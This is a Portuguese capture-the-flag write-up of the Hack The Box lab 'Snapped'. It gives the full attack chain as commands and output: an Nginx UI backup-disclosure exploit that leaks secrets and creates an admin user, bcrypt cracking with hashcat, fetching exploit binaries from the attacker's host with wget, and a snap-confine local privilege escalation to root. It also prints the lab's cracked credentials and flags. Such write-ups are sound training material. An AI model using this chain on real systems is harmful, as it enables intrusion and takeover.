# Snapped

**Difficulty: Hard** 

```
IP: 10.129.10.201
```

### nmap
```bash
nmap -p- -v 10.129.10.201

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
nmap -p 22,80 -sV -sC 10.129.10.201

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://snapped.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vou adicionar o snapped.htb no /etc/hosts

Acessando o `http://snapped.htb/`
![](../../assets/{A278A43E-1ACF-4785-831D-2072853B1092}.png)

### ffuf
```bash
ffuf -u http://snapped.htb/FUZZ -w /opt/seclists/Discovery/Web-Content/big.txt -mc all -e .php,.js,.txt,.bak,.zip,.html -fw 6

index.html              [Status: 200]
```

```bash
ffuf -u http://snapped.htb/ -H "Host: FUZZ.snapped.htb" -w /opt/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fw 4

admin                   [Status: 200]
```

Adicionando admin.snapped.htb no /etc/hosts é possível encontrar uma página de login.
![](../../assets/{469BA369-B264-4161-8D0E-82009FB9E5F0}.png)

Analisando o DevTools -> Network encontrei  `http://admin.snapped.htb/assets/index-DoHxQupa.js`. Acessando diretamente o diretório `/assets/`, percebi que o directory listing estava habilitado, expondo todos os arquivos estáticos do frontend.
![](../../assets/{A6F2945F-E941-4342-B401-E41DAE4A8BE4}.png)

Acessando o arquivo `version-BWPlJ0ga.js` foi possível identificar a versão exata do Nginx UI: `2.3.2`

Nginx UI 2.3.2
Vulnerabilidade:
- CVE-2026-27944
O endpoint `/api/backup` não implementa middleware de autenticação. A chave AES-256 é exposta diretamente no header `X-Backup-Security` em base64. Isso permite que qualquer cliente não autenticado baixe e decripte o backup completo.

O vulnhub disponibiliza um PoC, vou utilizar:

```bash
wget https://raw.githubusercontent.com/vulhub/vulhub/master/nginx-ui/CVE-2026-27944/poc.py

python poc.py -u http://admin.snapped.htb --create-user hacker
```

O PoC executou o chain completo.
```bash
[*] Target: http://admin.snapped.htb
[*] Output: /tmp/nginx-ui-backup-av66tm76

[*] Requesting backup from http://admin.snapped.htb/api/backup
[+] Downloaded backup: 18306 bytes
[+] X-Backup-Security: VB9D5RinqiDcLDhidf01Q92MEWwounkKM+GSR3kEJIc=:zdcVTKUIKbtEWeEPQRNdCw==
[+] AES Key (256-bit): 541f43e518a7aa20dc2c386275fd3543dd8c116c28ba790a33e1924779042487
[+] AES IV  (128-bit): cdd7154ca50829bb4459e10f41135d0b
[+] Decrypted: hash_info.txt (199 bytes)
[+] Decrypted: nginx-ui.zip (7688 bytes)
[+] Decrypted: nginx.zip (9936 bytes)

[+] === Extracted Secrets from app.ini ===
    JwtSecret:    6c4af436-035a-4942-9ca6-172b36696ce9
    Node Secret:  c64d7ca1-19cb-4ebe-96d4-49037e7df78e
    Crypto Secret: 5c942292647d73f597f47c0be2237bf7347cdb70a0e8e8558e448318862357d6

[+] === Users from database ===
    ID=1  Name=admin  Password=$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
    ID=2  Name=jonathan  Password=$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq

[+] === Active Auth Tokens ===
    (no active tokens)

[*] === Exploiting with X-Node-Secret ===
[+] Admin API access successful!
[+] Response from http://admin.snapped.htb/api/users:
{
  "data": [
    {
      "id": 2,
      "created_at": "2026-03-19T09:54:01.989628406-04:00",
      "updated_at": "2026-03-19T09:54:01.989628406-04:00",
      "name": "jonathan",
      "status": true,
      "enabled_2fa": false,
      "language": "en"
    },
    {
      "id": 1,
      "created_at": "2026-03-19T08:22:54.41011219-04:00",
      "updated_at": "2026-03-19T08:39:11.562741743-04:00",
      "name": "admin",
      "status": true,
      "enabled_2fa": false,
      "language": "en"
    }
  ],
  "pagination": {
    "total": 2,
    "per_page": 20,
    "current_page": 1,
    "total_pages": 1
  }
}

[*] === Obtaining Admin JWT Token ===
[*] Creating new admin user 'hacker' via X-Node-Secret...
[+] User 'hacker' created (ID=3), password: H8mlV44w9qQ0HWoB
[*] Fetching RSA public key...
[*] Logging in as 'hacker'...
[+] Login successful! JWT token obtained.

============================================================
[+] Exploitation complete!
[+] Decrypted files saved to: /tmp/nginx-ui-backup-av66tm76
[+] Admin API: curl -H 'X-Node-Secret: c64d7ca1-19cb-4ebe-96d4-49037e7df78e' http://admin.snapped.htb/api/users
[+] JWT Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiaGFja2VyIiwidXNlcl9pZCI6MywiaXNzIjoiTmdpbnggVUkiLCJzdWIiOiJoYWNrZXIiLCJleHAiOjE3ODAyMTEwNjIsIm5iZiI6MTc4MDEyNDY2MiwiaWF0IjoxNzgwMTI0NjYyLCJqdGkiOiIzIn0.9aOqT7JzKw2oILwxdPJTm7XidgILPfTTMUw1lHKtJgQ
[+] Browser access: paste the following in browser console (F12):
    document.cookie="token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiaGFja2VyIiwidXNlcl9pZCI6MywiaXNzIjoiTmdpbnggVUkiLCJzdWIiOiJoYWNrZXIiLCJleHAiOjE3ODAyMTEwNjIsIm5iZiI6MTc4MDEyNDY2MiwiaWF0IjoxNzgwMTI0NjYyLCJqdGkiOiIzIn0.9aOqT7JzKw2oILwxdPJTm7XidgILPfTTMUw1lHKtJgQ;path=/"
    Then refresh the page to enter admin panel.
```

O script usou o node_secret extraído do app.ini para acessar a API administrativa sem autenticacao, criou o usuário `hacker` e obteve um JWT Token válido.

Agora vou injetar o cookie no browser:
![](../../assets/{1E953C94-5AA5-45EA-ACE3-C887250C2244}.png)

Agora tenho acesso ao dashboard.
![](../../assets/{28FEA004-703A-4509-8104-680DCA60531A}.png)

O terminal do dashboard parece estar falhando.
![](../../assets/{8965384D-67F5-453B-89FC-5C2D357F858B}.png)

### hashcat
Tenho o bcrypt do admin e jonathan, vou tentar fazer um brute force.
```bash
echo '$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm' > hashes.txt
echo '$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq' >> hashes.txt

hashcat -m 3200 hashes.txt /opt/rockyou.txt

$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:linkinpark
```

### ssh
```bash
ssh jonathan@10.129.10.201
jonathan@10.129.10.201's password: linkinpark
```

### User flag
```bash
jonathan@snapped:~$ cat user.txt 
852da081c339a0e3efb03c6283652473
```

Vou rodar o LinEnum

```
python3 -m "http.server"
```

```bash
curl http://<IP>:8000/LinEnum.sh -o LinEnum.sh
jonathan@snapped:~$ chmod +x LinEnum.sh
```

### LinEnum
```bash
jonathan@snapped:~$ ./LinEnum.sh

/snap/snapd/21759/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 135960 Apr 24  2024 /snap/snapd/21759/usr/lib/snapd/snap-confine
```

```bash
jonathan@snapped:/usr/local/etc/nginx-ui$ snap --version
snap    2.63.1+24.04
snapd   2.63.1+24.04
series  16
ubuntu  24.04
kernel  6.17.0-19-generic
```

Essa versão do snap é vulnerável a CVE-2026-3888. Vou usar o exploit do TheCyberGeek.

Na minha máquina:
```bash
git clone https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE

cd CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE/

gcc -O2 -static -o exploit exploit_suid.c

gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c

python3 -m http.server 8080
```

Agora no alvo:
```bash
jonathan@snapped:~$ wget http://<IP>:8000/exploit

jonathan@snapped:~$ wget http://<IP>:8000/librootshell.so

jonathan@snapped:~$ chmod +x exploit
```

Vou criar um sandbox do firefox snap e executar uma shell dentro dele:
```bash
jonathan@snapped:~$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash
```

Dentro do sandbox monitoro o .snap, o loop mantém o diretório vivo até o exploit 
```bash
jonathan@snapped:~$ cd /tmp
jonathan@snapped:/tmp$ while test -d ./.snap; do touch ./; sleep 30; done
<test -d ./.snap; do touch ./; sleep 10; done && echo "SNAP DELETADO!"
SNAP DELETADO!
```

Em outro terminal do jonathan:
```bash
jonathan@snapped:~$ ./exploit ./librootshell.so
================================================================
    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
================================================================
[*] Payload: /home/jonathan/./librootshell.so (9152 bytes)

[Phase 1] Entering Firefox sandbox...
[+] Inner shell PID: 4242

[Phase 2] Waiting for .snap deletion...
[+] .snap already gone!

[Phase 3] Destroying cached mount namespace...
cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_ho4h53//dev: No such file or directory
[+] Namespace destroyed.

[Phase 4] Setting up and running the race...
[*]   Working directory: /proc/4242/cwd
[*]   Building .snap and .exchange...
[*]   285 entries copied to exchange directory
[*]   Starting race...
[*]   Monitoring snap-confine (child PID 4261)...

[!]   TRIGGER — swapping directories...
[+]   SWAP DONE — race won!
[*]   ld-linux in namespace: jonathan:jonathan 755
[+]   Poisoned namespace PID: 4261

[Phase 5] Injecting payload into poisoned namespace...
[+]   ld-linux owned by uid 1000 (attacker). Race confirmed.
[*]   Planting busybox...
[*]   Writing escape script → /tmp/sh
[*]   Overwriting ld-linux-x86-64.so.2...
[+]   Payload injected.

[Phase 6] Triggering root via SUID snap-confine...
[*]   snap-confine → snap-confine (SUID trigger)
[*]   Exit status: 0

[Phase 7] Verifying...
[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)
[*] Cleaning up background processes...

================================================================
  ROOT SHELL: /var/snap/firefox/common/bash -p
================================================================
```

```bash
bash-5.1# whoami
root
```

Funcionou, agora sou root.

### Root flag
```bash
bash-5.1# cat root.txt 
18491525d65147dd8be59b15c3f39995
```
